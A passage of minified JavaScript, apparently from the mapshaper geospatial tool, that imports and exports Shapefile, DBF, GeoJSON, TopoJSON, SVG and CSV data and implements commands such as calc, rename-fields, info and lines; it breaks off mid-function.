e=It.filterEmptyArcs(e,t),e&&0!==e.length?e.length>1?(n.arcs=It.explodePolygon(e,t),1==n.arcs.length?(n.arcs=n.arcs[0],n.type="Polygon"):n.type="MultiPolygon"):(n.arcs=e,n.type="Polygon"):n.type=null,n},Lt.exportLineGeom=function(e,t){var n={};return e=It.filterEmptyArcs(e,t),e&&0!==e.length?1==e.length?(n.type="LineString",n.arcs=e[0]):(n.type="MultiLineString",n.arcs=e):n.type=null,n},Lt.exporters={polygon:Lt.exportPolygonGeom,polyline:Lt.exportLineGeom,point:Nt.exportPointGeom};var Tt={NULL:0,POINT:1,POLYLINE:3,POLYGON:5,MULTIPOINT:8,POINTZ:11,POLYLINEZ:13,POLYGONZ:15,MULTIPOINTZ:18,POINTM:21,POLYLINEM:23,POLYGONM:25,MULIPOINTM:28,MULTIPATCH:31};Tt.isPolygonType=function(e){return 5==e||15==e||25==e},Tt.isPolylineType=function(e){return 3==e||13==e||23==e},Tt.isMultiPartType=function(e){return Tt.isPolygonType(e)||Tt.isPolylineType(e)},Tt.isMultiPointType=function(e){return 8==e||18==e||28==e},Tt.isZType=function(e){return yt.contains([11,13,15,18],e)},Tt.isMType=function(e){return Tt.isZType(e)||yt.contains([21,23,25,28],e)},Tt.hasBounds=function(e){return Tt.isMultiPartType(e)||Tt.isMultiPointType(e)},It.translateShapefileType=function(e){return yt.contains([Tt.POLYGON,Tt.POLYGONM,Tt.POLYGONZ],e)?"polygon":yt.contains([Tt.POLYLINE,Tt.POLYLINEM,Tt.POLYLINEZ],e)?"polyline":yt.contains([Tt.POINT,Tt.POINTM,Tt.POINTZ,Tt.MULTIPOINT,Tt.MULTIPOINTM,Tt.MULTIPOINTZ],e)?"point":null},It.isSupportedShapefileType=function(e){return yt.contains([0,1,3,5,8,11,13,15,18,21,23,25,28],e)},It.getShapefileType=function(e){return{polygon:Tt.POLYGON,polyline:Tt.POLYLINE,point:Tt.MULTIPOINT}[e]||Tt.NULL};var Bt=function(){return{isNull:!0,pointCount:0,partCount:0,byteLength:12}};yt.replaceFileExtension=function(e,t){var n=yt.parseLocalPath(e);return n.pathbase+"."+t},yt.getPathSep=function(e){return-1==e.indexOf("/")&&-1!=e.indexOf("\\")?"\\":"/"},yt.parseLocalPath=function(e){var t,n={},r=yt.getPathSep(e),i=e.split(r);return 1==i.length?(n.filename=i[0],n.directory=""):(n.filename=i.pop(),n.directory=i.join(r)),t=n.filename.lastIndexOf("."),t>-1?(n.extension=n.filename.substr(t+1),n.basename=n.filename.substr(0,t),n.pathbase=e.substr(0,e.lastIndexOf("."))):(n.extension="",n.basename=n.filename,n.pathbase=e),n},yt.getFileBase=function(e){return yt.parseLocalPath(e).basename},yt.getFileExtension=function(e){return yt.parseLocalPath(e).extension},yt.getPathBase=function(e){return yt.parseLocalPath(e).pathbase},yt.getCommonFileBase=function(e){return e.reduce(function(e,t,n){return e=0===n?yt.getFileBase(t):yt.mergeNames(e,t)},"")},yt.getOutputFileBase=function(e){var t=e.info&&e.info.input_files;return t&&yt.getCommonFileBase(t)||"output"},It.guessInputFileType=function(e){var t=yt.getFileExtension(e||"").toLowerCase(),n=null;return"dbf"==t||"shp"==t||"prj"==t?n=t:/json$/.test(t)&&(n="json"),n},It.guessInputContentType=function(e){var t=null;return yt.isString(e)?t=It.stringLooksLikeJSON(e)?"json":"text":(yt.isObject(e)&&e.type||yt.isArray(e))&&(t="json"),t},It.guessInputType=function(e,t){return It.guessInputFileType(e)||It.guessInputContentType(t)},It.stringLooksLikeJSON=function(e){return/^\s*[{[]/.test(String(e))},It.couldBeDsvFile=function(e){var t=yt.getFileExtension(e).toLowerCase();return/csv|tsv|txt$/.test(t)},It.inferOutputFormat=function(e,t){var n=yt.getFileExtension(e).toLowerCase(),r=null;return"shp"==n?r="shapefile":"dbf"==n?r="dbf":"svg"==n?r="svg":/json$/.test(n)?(r="geojson","topojson"==n||"topojson"==t&&"geojson"!=n?r="topojson":"json"==n&&"json"==t&&(r="json")):It.couldBeDsvFile(e)?r="dsv":t&&(r=t),r},It.isZipFile=function(e){return/\.zip$/i.test(e)},It.isSupportedOutputFormat=function(e){var t=["geojson","topojson","json","dsv","dbf","shapefile","svg"];return t.indexOf(e)>-1},It.getFormatName=function(e){return{geojson:"GeoJSON",topojson:"TopoJSON",json:"JSON records",dsv:"CSV",dbf:"DBF",shapefile:"Shapefile",svg:"SVG"}[e]||""},It.isBinaryFile=function(e){var t=yt.getFileExtension(e).toLowerCase();return"shp"==t||"dbf"==t||"zip"==t},It.filenameIsUnsupportedOutputType=function(e){var t=/\.(shx|prj|xls|xlsx|gdb|sbn|sbx|xml|kml)$/i;return t.test(e)};var Dt={};Dt.isFile=function(e){var t=Dt.statSync(e);return t&&t.isFile()||!1},Dt.fileSize=function(e){var t=Dt.statSync(e);return t&&t.size||0},Dt.isDirectory=function(e){var t=Dt.statSync(e);return t&&t.isDirectory()||!1},Dt.readFile=function(e,t){var n="/dev/stdin"==e?STtwUtilRequire.rw:STtwUtilRequire.fs,r=n.readFileSync(e);return t&&(r=It.decodeString(r,t)),r},Dt.writeFile=function(e,t){t instanceof ArrayBuffer&&(t=Dt.convertArrayBuffer(t)),STtwUtilRequire.rw.writeFileSync(e,t)},Dt.convertArrayBuffer=function(e){for(var t=new Uint8Array(e),n=new Buffer(t.length),r=0,i=t.length;i>r;r++)n[r]=t[r];return n},Dt.expandFileName=function(e){if(-1==e.indexOf("*"))return[e];var t=yt.parseLocalPath(e),n=t.directory||".",r=require("fs").readdirSync(n),i=yt.wildcardToRegExp(t.filename);return r.reduce(function(e,t){var r=require("path").join(n,t);return i.test(t)&&Dt.isFile(r)&&e.push(r),e},[])},Dt.validateInputFiles=function(e){return e=e.reduce(function(e,t){return e.concat(Dt.expandFileName(t))},[]),e.forEach(Dt.checkFileExists),e},Dt.validateOutputDir=function(e){Dt.isDirectory(e)||i("Output directory not found:",e)},Dt.checkFileExists=function(e){Dt.isFile(e)||"/dev/stdin"==e||o("File not found ( "+e+" )")},Dt.statSync=function(e){var t=null;try{t=require("fs").statSync(e)}catch(n){}return t},Se.prototype.type=function(){return this.header().type},Se.prototype.getCounts=function(){var e={nullCount:0,partCount:0,shapeCount:0,pointCount:0};return this.forEachShape(function(t){t.isNull&&e.nullCount++,e.pointCount+=t.pointCount,e.partCount+=t.partCount,e.shapeCount++}),e},It.importShp=function(e,t){var n=new Se(e),r=n.type(),i=It.translateShapefileType(r),a=yt.defaults({type:i,reserved_points:Math.round(n.header().byteLength/16)},t),u=new xe(a);return It.isSupportedShapefileType(r)||o("Unsupported Shapefile type:",r),Tt.isZType(r)?s("Warning: Shapefile Z data will be lost."):Tt.isMType(r)&&s("Warning: Shapefile M data will be lost."),n.forEachShape(function(e){u.startShape(),e.isNull||("point"==i?u.importPoints(e.readPoints()):e.stream(u))}),u.done()},It.exportShapefile=function(e,t){return e.layers.reduce(function(n,r){var i=It.exportPrjFile(r,e);return n=n.concat(It.exportShpAndShxFiles(r,e,t)),n=n.concat(It.exportDbfFile(r,e,t)),i&&n.push(i),n},[])},It.exportPrjFile=function(e,t){var n=t.info&&t.info.output_prj;return n||null===n||(n=t.info&&t.info.input_prj),n?{content:n,filename:e.name+".prj"}:null},It.exportShpAndShxFiles=function(e,r,i){var o=e.geometry_type,a=It.getShapefileType(o),s=100,u=new t,l=e.shapes||yt.initializeArray(new Array(It.getFeatureCount(e)),null),c=l.map(function(e,t){var n=It.exportPathData(e,r.arcs,o),i=It.exportShpRecord(n,t+1,a);return s+=i.buffer.byteLength,i.bounds&&u.mergeBounds(i.bounds),i.buffer}),f=new n(s,!1).writeInt32(9994).skipBytes(20).writeInt32(s/2).littleEndian().writeInt32(1e3).writeInt32(a);u.hasBounds()?f.writeFloat64(u.xmin||0).writeFloat64(u.ymin||0).writeFloat64(u.xmax||0).writeFloat64(u.ymax||0):f.skipBytes(32),f.skipBytes(32);var p=100+8*c.length,d=new n(p,!1).writeBuffer(f.buffer(),100).position(24).bigEndian().writeInt32(p/2).position(100);return c.forEach(function(e,t){var n=f.position()/2,r=(e.byteLength-8)/2;d.writeInt32(n),d.writeInt32(r),f.writeBuffer(e)}),[{content:f.buffer(),filename:e.name+".shp"},{content:d.buffer(),filename:e.name+".shx"}]},It.exportShpRecord=function(e,t,r){var o=null,a=null;if(e.pointCount>0){var s=Tt.isMultiPartType(r),u=52,l=s?u+4*e.pathCount:48,c=l+16*e.pointCount,f=0;o=e.bounds,a=new n(c,!1).writeInt32(t).writeInt32((c-8)/2).littleEndian().writeInt32(r).writeFloat64(o.xmin).writeFloat64(o.ymin).writeFloat64(o.xmax).writeFloat64(o.ymax),s?a.writeInt32(e.pathCount):e.pathData.length>1&&i("[exportShpRecord()] Tried to export multiple paths as type:",r),a.writeInt32(e.pointCount),e.pathData.forEach(function(e,t){s&&a.position(u+4*t).writeInt32(f),a.position(l+16*f);for(var n=e.points,r=0,i=n.length;i>r;r++)a.writeFloat64(n[r][0]),a.writeFloat64(n[r][1]);f+=r}),e.pointCount!=f&&i("Shp record point count mismatch; pointCount:",f,"data.pointCount:",e.pointCount)}else a=new n(12,!1).writeInt32(t).writeInt32(2).littleEndian().writeInt32(0);return{bounds:o,buffer:a.buffer()}},It.importDbfTable=function(e,t){var n=t||{};return new Ie(e,n.encoding)},yt.extend(Ie.prototype,Ct),It.exportDbf=function(e,t){return e.layers.reduce(function(n,r){return r.data&&(n=n.concat(It.exportDbfFile(r,e,t))),n},[])},It.exportDbfFile=function(e,t,n){var r,i=e.data;return(!i||n.cut_table||n.drop_table)&&(i=new ne(e.shapes.length)),0===i.getFields().length&&i.addIdField(),r=i.exportAsDbf(n.encoding||"utf8"),yt.isInteger(n.ldid)&&(new Uint8Array(r)[29]=n.ldid),[{content:r,filename:e.name+".dbf"}]},wt.svgStyle=function(e,t,n){var r=Object.keys(n),i=It.getStyleFields(r,It.svgStyles,It.invalidSvgTypes[e.geometry_type]);i.forEach(function(r){var i,o,a=n[r],s=null,u=It.svgStyleTypes[r];e.data||It.initDataTable(e),"number"==u&&It.isSvgNumber(a)?s=Number(a):"color"==u&&It.isSvgColor(a,e.data.getFields())?s=a:"classname"==u&&It.isSvgClassName(a,e.data.getFields())&&(s=a),null===s&&(o=It.compileValueExpression(a,e,t.arcs)),i=e.data.getRecords(),i.forEach(function(e,t){e[r]=o?o(t):s})})},It.isSvgClassName=function(e,t){return e=e.trim(),(!t||-1==t.indexOf(e))&&/^( ?[_a-z][-_a-z0-9]*\b)+$/i.test(e)},It.isSvgNumber=function(e){return yt.isFiniteNumber(e)||yt.isString(e)&&/^-?[.0-9]+$/.test(e)},It.isSvgColor=function(e,t){return e=e.trim(),(!t||-1==t.indexOf(e))&&/^[a-z]+$/i.test(e)||/^#[0-9a-f]+$/i.test(e)||/^rgba?\([0-9,. ]+\)$/.test(e)},It.getStyleFields=function(e,t,n){return e.reduce(function(e,r){return r in t&&(n&&-1!=n.indexOf(r)||e.push(r)),e},[])},It.getSvgStyleFields=function(e){var t=e.data?e.data.getFields():[];return It.getStyleFields(t,It.svgStyles,It.invalidSvgTypes[e.geometry_type])},It.layerHasSvgDisplayStyle=function(e){var t=It.getSvgStyleFields(e);return yt.difference(t,["opacity","class"]).length>0},It.invalidSvgTypes={polygon:["r"],polyline:["r","fill"]},It.svgStyles={"class":"class",opacity:"opacity",r:"radius",fill:"fillColor",stroke:"strokeColor",stroke_width:"strokeWidth"},It.svgStyleTypes={"class":"classname",opacity:"number",r:"number",fill:"color",stroke:"color",stroke_width:"number"};var Rt={};Rt.importGeoJSONFeatures=function(e){return e.map(function(e,t){var n,r="Feature"==e.type?e.geometry:e,i=r&&r.type;return i?(n=Rt.geojsonImporters[i](r.coordinates),e.properties&&Rt.applyStyleAttributes(n,i,e.properties),"id"in e&&(n.properties||(n.properties={}),n.properties.id=e.id),n):{tag:"g"}})},Rt.stringify=function(e){var t="<"+e.tag;return e.properties&&(t+=Rt.stringifyProperties(e.properties)),e.children?(t+=">\n",t+=e.children.map(Rt.stringify).join("\n"),t+="\n</"+e.tag+">"):t+="/>",t},Rt.stringifyProperties=function(e){return Object.keys(e).reduce(function(t,n,r){var i=e[n],o=JSON.stringify(i);if('"'!=o.charAt(0)){if(!yt.isFiniteNumber(i))return t;o='"'+o+'"'}return t+" "+n+"="+o},"")},Rt.applyStyleAttributes=function(e,t,n){for(var r,i=(e.properties,It.invalidSvgTypes[Nt.translateGeoJSONType(t)]),o=It.getStyleFields(Object.keys(n),It.svgStyles,i),a=0,s=o.length;s>a;a++)r=o[a],Rt.setAttribute(e,r.replace("_","-"),n[r])},Rt.setAttribute=function(e,t,n){var r,i;if("r"!=t&&"class"!=t||!e.children)e.properties||(e.properties={}),e.properties[t]=n;else{r=e.children;for(var o=0;o<r.length;o++)i=r[o],i.properties||(i.properties={}),i.properties[t]=n}},Rt.importMultiGeometry=function(e,t){for(var n={tag:"g",children:[]},r=0;r<e.length;r++)n.children.push(t(e[r]));return n},Rt.mapVertex=function(e){return e[0]+" "+-e[1]},Rt.importLineString=function(e){var t="M "+e.map(Rt.mapVertex).join(" ");return{tag:"path",properties:{d:t}}},Rt.importPoint=function(e){return{tag:"circle",properties:{cx:e[0],cy:-e[1]}}},Rt.importPolygon=function(e){for(var t,n,r=0;r<e.length;r++)t=n?n.properties.d+" ":"",n=Rt.importLineString(e[r]),n.properties.d=t+n.properties.d+" Z";return n},Rt.geojsonImporters={Point:Rt.importPoint,Polygon:Rt.importPolygon,LineString:Rt.importLineString,MultiPoint:function(e){return Rt.importMultiGeometry(e,Rt.importPoint)},MultiLineString:function(e){return Rt.importMultiGeometry(e,Rt.importLineString)},MultiPolygon:function(e){return Rt.importMultiGeometry(e,Rt.importPolygon)}},It.exportSVG=function(e,t){var n,r,i='<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" version="1.2" baseProfile="tiny" width="%d" height="%d" viewBox="%s %s %s %s" stroke-linecap="round" stroke-linejoin="round">\n%s\n</svg>';return t.cloned||(e=It.copyDataset(e)),n=It.transformCoordsForSVG(e,t),r=e.layers.map(function(n){return It.exportLayerAsSVG(n,e,t)}).join("\n"),r=yt.format(i,n.width(),n.height(),0,0,n.width(),n.height(),r),[{content:r,filename:t.output_file||yt.getOutputFileBase(e)+".svg"}]},It.transformCoordsForSVG=function(e,n){var r,i,o,a=n.width>0?n.width:800,s=n.margin>=0?n.margin:1,u=It.getDatasetBounds(e),l=n.precision||1e-4;return n.svg_scale>0&&(a=u.width()/n.svg_scale,s=0),It.padViewportBoundsForSVG(u,a,s),r=Math.ceil(a*u.height()/u.width()),i=new t(0,-r,a,0),o=u.getTransform(i),It.transformPoints(e,function(e,t){return o.transform(e,t)}),It.setCoordinatePrecision(e,l),i},It.padViewportBoundsForSVG=function(e,t,n){var r,i=e.width()||e.height()||1;n>=0==!1&&(n=1),r=i/(t-2*n)*n,e.padBounds(r,r,r,r)},It.exportLayerAsSVG=function(e,t,n){var r=It.exportGeoJSONCollection(e,t,n),i=r.features||r.geometries||(r.type?[r]:[]),o=Rt.importGeoJSONFeatures(i),a={tag:"g",children:o,properties:{id:e.name}};return"polyline"==e.geometry_type&&(a.properties.fill="none",a.properties.stroke="black",a.properties["stroke-width"]=1),Rt.stringify(a)},It.roundPoints=function(e,t){It.forEachPoint(e.shapes,function(e){e[0]=t(e[0]),e[1]=t(e[1])})},It.setCoordinatePrecision=function(e,t){var n,r,i=_t.getRoundingFunction(t);return It.transformPoints(e,function(e,t){return[i(e),i(t)]}),e.arcs&&(r=It.divideArcs(e),n=It.getPolygonDissolver(r)),e.layers.forEach(function(e){"polygon"==e.geometry_type&&n&&(e.shapes=e.shapes.map(n))}),e},It.exportDelim=function(e,t){var n=It.getExportDelimiter(e.info,t),r=It.getDelimFileExtension(n,t);return e.layers.reduce(function(e,t){return t.data&&e.push({content:It.exportDelimTable(t,n),filename:(t.name||"output")+"."+r}),e},[])},It.exportDelimTable=function(e,t){for(var n=STtwUtilRequire.d3_dsv.dsvFormat(t),r=e.data.getFields(),i=It.getDelimRowFormatter(r,e.data),o=e.data.getRecords(),a=n.formatRows([r]),s=0,u=o.length;u>s;s++)a+="\n"+n.formatRows([i(o[s])]);return a},It.getDelimRowFormatter=function(e,t){var n=e.map(function(e){var n=It.getColumnType(e,t);return function(t){return"object"==n?JSON.stringify(t[e]):t[e]}});return function(e){for(var t=[],r=0;r<n.length;r++)t.push(n[r](e));return t}},It.getExportDelimiter=function(e,t){var n=",",r=t.output_file?yt.getFileExtension(t.output_file):"";return t.delimiter?n=t.delimiter:"tsv"==r?n="	":"csv"==r?n=",":e.input_delimiter&&(n=e.input_delimiter),n},It.getDelimFileExtension=function(e,t){var n="txt";return t.output_file?n=yt.getFileExtension(t.output_file):"	"==e?n="tsv":","==e&&(n="csv"),n},It.importJSONTable=function(e){return{layers:[{data:new ne(e)}],info:{}}},It.exportJSON=function(e,t){return e.layers.reduce(function(e,t){return t.data&&e.push({content:It.exportJSONTable(t),filename:(t.name||"output")+".json"}),e},[])},It.exportJSONTable=function(e){return JSON.stringify(e.data.getRecords())},It.exportFileContent=function(e,t){var n=t.format=It.getOutputFormat(e,t),r=It.exporters[n],o=[];return n?r||i("[o] Unknown export format:",n):i("[o] Missing output format"),e=yt.defaults({layers:e.layers.map(function(e){return yt.extend({},e)})},e),t.output_file&&"topojson"!=n&&e.layers.forEach(function(e){e.name=yt.getFileBase(t.output_file)}),t.precision&&"svg"!=n&&(e=It.copyDatasetForExport(e),It.setCoordinatePrecision(e,t.precision)),It.validateLayerData(e.layers),It.assignUniqueLayerNames(e.layers),t.cut_table&&(o=It.exportDataTables(e.layers,t).concat(o)),o=r(e,t).concat(o),t.bbox_index&&o.push(It.createIndexFile(e)),It.validateFileNames(o),o},It.exporters={geojson:It.exportGeoJSON,topojson:It.exportTopoJSON,shapefile:It.exportShapefile,dsv:It.exportDelim,dbf:It.exportDbf,json:It.exportJSON,svg:It.exportSVG},It.getOutputFormat=function(e,t){var n=t.output_file||null,r=e.info&&e.info.input_format,i=null;return t.format?i=t.format:n?i=It.inferOutputFormat(n,r):r&&(i=r),i},It.createIndexFile=function(e){var t=e.layers.map(function(t){var n=It.getLayerBounds(t,e.arcs);return{bbox:n.toArray(),name:t.name}});return{content:JSON.stringify(t),filename:"bbox-index.json"}},It.validateLayerData=function(e){e.forEach(function(e){e.geometry_type?(yt.contains(["polygon","polyline","point"],e.geometry_type)||i("[export] A layer has an invalid geometry type:",e.geometry_type),e.shapes||i("[export] A layer is missing shape data")):e.shapes&&yt.some(e.shapes,function(e){return!!e})&&i("[export] A layer contains shape records and a null geometry type")})},It.validateFileNames=function(e){var t={};e.forEach(function(e,n){var r=e.filename;r||i("[o] Missing a filename for file"+n),r in t&&i("[o] Duplicate filename",r),t[r]=!0})},It.assignUniqueLayerNames=function(e){var t=e.map(function(e){return e.name||"layer"}),n=It.uniqifyNames(t);e.forEach(function(e,t){e.name=n[t]})},It.assignUniqueLayerNames2=function(e){var t=e.reduce(function(e,t){return e.concat(t.layers)},[]);It.assignUniqueLayerNames(t)},It.assignUniqueFileNames=function(e){var t=e.map(function(e){return e.filename}),n=It.uniqifyNames(t,It.formatVersionedFileName);e.forEach(function(e,t){e.filename=n[t]})},It.exportDataTables=function(e,t){var n=[];return e.forEach(function(e){e.data&&n.push({content:e.data.exportAsJSON(),filename:(e.name?e.name+"-":"")+"table.json"})}),n},It.formatVersionedName=function(e,t){var n=String(t);return/[0-9]$/.test(e)&&(n="-"+n),e+n},It.formatVersionedFileName=function(e,t){var n,r,i=e.split(".");return i.length<2?It.formatVersionedName(e,t):(n=i.pop(),r=i.join("."),It.formatVersionedName(r,t)+"."+n)},It.uniqifyNames=function(e,t){var n=yt.countValues(e),r=t||It.formatVersionedName,i={};return Object.keys(n).forEach(function(e){n[e]>1&&(i[e]=!0)}),e.map(function(e){for(var t,n=1,o=e;o in i;){if(t=r(e,n),!t||t==o)throw new Error("Naming error");o=t,n++}return i[o]=!0,o})},wt.evaluateEachFeature=function(e,t,n,r){var i,o,a=It.getFeatureCount(e);a>0&&!e.data&&(e.data=new ne(a)),r&&r.where&&(o=It.compileValueExpression(r.where,e,t)),i=It.compileFeatureExpression(n,e,t);for(var s=0;a>s;s++)(!o||o(s))&&i(s)},wt.calc=function(e,t,n){var r,i="calc "+n.expression;return n.where&&(e={shapes:e.shapes,data:e.data},wt.filterFeatures(e,t,{expression:n.where}),i+=" where "+n.where),r=It.evalCalcExpression(e,t,n.expression),s(i+":	"+r),r},It.evalCalcExpression=function(e,t,n){var r=It.compileCalcExpression(n);return r(e,t)},It.compileCalcExpression=function(e){return function(t,n){var r,i,a=It.getCalcExpressionContext(t,n);try{r=new Function("env","with(env){return "+e+";}"),i=r.call(null,a)}catch(u){s("Error "+(r?"compiling":"running")+' expression: "'+e+'"'),o(u)}return i}},It.getCalcExpressionContext=function(e,t){var n=It.getBaseContext();return e.data&&e.data.getFields().forEach(function(e){n[e]=e}),It.initCalcFunctions(n,e,t),n},It.initCalcFunctions=function(e,t,n){var r=Object.keys((new Ae).functions);r.forEach(function(r){e[r]=It.getCalcFunction(r,t,n)})},It.getCalcFunction=function(e,t,n){return function(r){var i=new Ae,o=i.functions[e],a=It.compileValueExpression(r,t,n);return yt.repeat(It.getFeatureCount(t),function(e){o(a(e))}),i.done()[e]}},It.importContent=function(e,t){var n,r,i,a;if(t=t||{},e.json){if(a=e.json,r=a.content,yt.isString(r))try{r=JSON.parse(r)}catch(s){o("Unable to parse JSON")}"Topology"==r.type?(i="topojson",n=It.importTopoJSON(r,t)):r.type?(i="geojson",n=It.importGeoJSON(r,t)):yt.isArray(r)&&(i="json",n=It.importJSONTable(r,t))}else e.text?(i="dsv",a=e.text,n=It.importDelim(a.content,t)):e.shp?(i="shapefile",a=e.shp,n=It.importShapefile(e,t)):e.dbf&&(i="dbf",a=e.dbf,n=It.importDbf(e,t));return n||o("Missing an expected input type"),n.arcs&&!t.no_topology&&"topojson"!=i&&(bt.start(),wt.buildTopology(n),bt.stop("Process topology")),"topojson"!=i&&It.setLayerName(n.layers[0],It.filenameToLayerName(a.filename||"")),a.filename&&(n.info.input_files=[a.filename]),n.info.input_format=i,n},It.importFileContent=function(e,t,n){var r=It.guessInputType(t,e),i={};return i[r]={filename:t,content:e},It.importContent(i,n)},It.importShapefile=function(e,t){var n,r=e.shp.content||e.shp.filename,i=It.importShp(r,t),o=i.layers[0];return e.dbf&&(n=It.importDbf(e,t),yt.extend(i.info,n.info),o.data=n.layers[0].data,o.shapes&&o.data.size()!=o.shapes.length&&s("[shp] Mismatched .dbf and .shp record count -- possible data loss.")),e.prj&&(i.info.input_prj=e.prj.content),i},It.importDbf=function(e,t){var n;return t=yt.extend({},t),e.cpg&&!t.encoding&&(t.encoding=e.cpg.content),n=It.importDbfTable(e.dbf.content,t),{info:{},layers:[{data:n}]}},It.filenameToLayerName=function(e){var t="layer1",n=yt.parseLocalPath(e);return n.basename&&n.extension&&(t=n.basename),t},It.setLayerName=function(e,t){e.name||(e.name=yt.getFileBase(t))},wt.importFiles=function(e){var t,n=e.files?Dt.validateInputFiles(e.files):[];return(e.merge_files||e.combine_files)&&n.length>1?t=wt.mergeFiles(n,e):1==n.length?t=wt.importFile(n[0],e):e.stdin?t=wt.importFile("/dev/stdin",e):o("Missing input file(s)"),t},wt.importFile=function(e,t){Dt.checkFileExists(e);var n,r,a=It.isBinaryFile(e),u="shp"==It.guessInputFileType(e),l={};if(r=u?null:a?Dt.readFile(e):Dt.readFile(e,t&&t.encoding||"utf-8"),n=It.guessInputFileType(e)||It.guessInputContentType(r)){if("json"==n)try{r=JSON.parse(r)}catch(c){o("Unable to parse JSON")}}else i("Unkown file type:",e);return l[n]={filename:e,content:r},r=null,("shp"==n||"dbf"==n)&&It.readShapefileAuxFiles(e,l),"shp"!=n||l.dbf||s(yt.format("[%s] .dbf file is missing - shapes imported without attribute data.",e)),It.importContent(l,t)},wt.importDataTable=function(e,t){var n=wt.importFile(e,t);return n.layers[0].data},It.readShapefileAuxFiles=function(e,t){var n=yt.replaceFileExtension(e,"dbf"),r=yt.replaceFileExtension(e,"cpg"),i=yt.replaceFileExtension(e,"prj");Dt.isFile(i)&&(t.prj={filename:i,content:Dt.readFile(i,"utf-8")}),!t.dbf&&Dt.isFile(n)&&(t.dbf={filename:n,content:Dt.readFile(n)}),t.dbf&&Dt.isFile(r)&&(t.cpg={filename:r,content:Dt.readFile(r,"utf-8").trim()})},wt.exportFiles=function(e,t){It.writeFiles(It.exportFileContent(e,t),t)},It.writeFiles=function(e,t,n){if(e.length>0==!1)s("No files to save");else if(t.dry_run);else if(t.stdout)Dt.writeFile("/dev/stdout",e[0].content);else{var r=It.getOutputPaths(yt.pluck(e,"filename"),t);e.forEach(function(e,t){var n=r[t];Dt.writeFile(n,e.content),s("Wrote "+n)})}n&&n(null)},It.getOutputPaths=function(e,t){var n=t.output_dir;return n&&(e=e.map(function(e){return require("path").join(n,e)})),t.force||(e=Fe(e)),e},wt.filterFields=function(e,t){var n=e.data;It.requireDataFields(n,t,"filter-fields"),yt.difference(n.getFields(),t).forEach(n.deleteField,n)},wt.renameFields=function(e,t){var n=It.mapFieldNames(t);It.requireDataFields(e.data,Object.keys(n),"rename-fields"),yt.defaults(n,It.mapFieldNames(e.data.getFields())),e.data.update(It.getRecordMapper(n))},It.mapFieldNames=function(e){return e.reduce(function(e,t){var n=t.split("="),r=n[0],i=n[1]||r;return i&&r||o("[rename-fields] Invalid field description:",t),e[i]=r,e},{})},It.getRecordMapper=function(e){var t=Object.keys(e);return function(n){for(var r,i={},o=0,a=t.length;a>o;o++)r=t[o],i[e[r]]=n[r];return i}},wt.printInfo=function(e,t){var n=e.layers.map(function(t,n){var r=It.getLayerInfo(t,e.arcs);return e.layers.length>1&&(r="Layer "+(n+1)+"\n"+r),r}).join("\n\n");s(n)},It.countNullShapes=function(e){for(var t=0,n=0;n<e.length;n++)e[n]&&0!==e[n].length||t++;return t},It.getGeometryInfo=function(e,t){var n=e.geometry_type||"[none]";return yt.isInteger(t)&&e.shapes&&!e.shapes[t]&&(n="[null]"),"Geometry: "+n+"\n"},It.getLayerInfo=function(e,t){var n,r=e.shapes?e.shapes.length:0,i=r>0?It.countNullShapes(e.shapes):0;return n="Layer name: "+(e.name||"[unnamed]")+"\n",n+=yt.format("Records: %,d\n",It.getFeatureCount(e)),n+=It.getGeometryInfo(e),i>0&&(n+=yt.format("Null shapes: %'d\n",i)),r>i&&(n+="Bounds: "+It.getLayerBounds(e,t).toArray().join(" ")+"\n"),n+=It.getTableInfo(e)},It.getTableInfo=function(e,t){return e.data&&0!==e.data.size()?It.getAttributeInfo(e.data,t):"Attribute data: [none]"},It.getAttributeInfo=function(e,t){var n=t||0,r=t>=0?"Value":"First value",i=e.getFields().sort(),o=i.reduce(function(e,t){return Math.max(e,t.length)},5)+2,a=i.map(function(t){return e.getRecordAt(n)[t]}),s=a.reduce(function(e,t){return yt.isNumber(t)&&(e=Math.max(e,It.countIntegralChars(t))),e},0),u=a.map(function(e,t){return"	"+It.formatTableItem(i[t],e,o,s)}).join("\n");return"Attribute data\n	"+yt.rpad("Field",o," ")+r+"\n"+u},It.formatNumber=function(e){return e+""},It.formatString=function(e){var t={"\n":"\\n","\r":"\\r","	":"\\t"},n=function(e){return e in t?t[e]:""};return e=e.replace(/[\r\t\n]/g,n),"'"+e+"'"},It.countIntegralChars=function(e){return yt.isNumber(e)?(It.formatNumber(e)+".").indexOf("."):0},It.formatTableItem=function(e,t,n,r){var i=yt.rpad(e,n," ");return i+=yt.isNumber(t)?yt.lpad("",r-It.countIntegralChars(t)," ")+It.formatNumber(t):yt.isString(t)?It.formatString(t):yt.isObject(t)?JSON.stringify(t):String(t)},It.getSimplificationInfo=function(e){new ee(e).size(),It.countInteriorVertices(e)},It.countInteriorVertices=function(e){var t=0;return e.forEach2(function(e,n){n>2&&(t+=n-2)}),t},wt.innerlines=function(e,t,n){It.requirePolygonLayer(e,"[innerlines] Command requires a polygon layer");var r=It.getArcClassifier(e.shapes,t),i=It.extractInnerLines(e.shapes,r),o=It.createLineLayer(i,null);return 0===i.length&&s("[innerlines] No shared boundaries were found"),o.name=n&&n.no_replace?null:e.name,o},wt.lines=function(e,t,n){function r(e){var t=e.map(function(e,t){return{TYPE:u}});l=yt.merge(e,l),c=yt.merge(t,c),u++}n=n||{};var i,a=It.getArcClassifier(e.shapes,t),s=yt.isArray(n.fields)?n.fields:[],u=0,l=[],c=[];return It.requirePolygonLayer(e,"[lines] Command requires a polygon layer"),s.length>0&&!e.data&&o("[lines] Missing a data table"),r(It.extractOuterLines(e.shapes,a)),s.forEach(function(t){var n=e.data.getRecords(),i=function(e,r){var i=n[e],o=n[r];return i&&o&&i[t]!==o[t]?e+"-"+r:""};e.data.fieldExists(t)||o("[lines] Unknown data field:",t),r(It.extractLines(e.shapes,a(i)))}),r(It.extractInnerLines(e.shapes,a)),i=It.createLineLayer(l,c),i.name=n.no_replace?null:e.name,i},It.createLineLayer=function(e,t){return{geometry_type:"polyline",shapes:e,data:t?new ne(t):null}},It.extractOuterLines=function(e,t){var n=function(e,t){return-1==t?String(e):""};return It.extractLines(e,t(n))},It.extractInnerLines=function(e,t){var n=function(e,t){return t>-1?e+"-"+t:""};return It.extractLines(e,t(n))},It.extractLines=function(e,t){function n(e){var n,r,l=e.arcId,f=t(c(l));f&&(r=f in 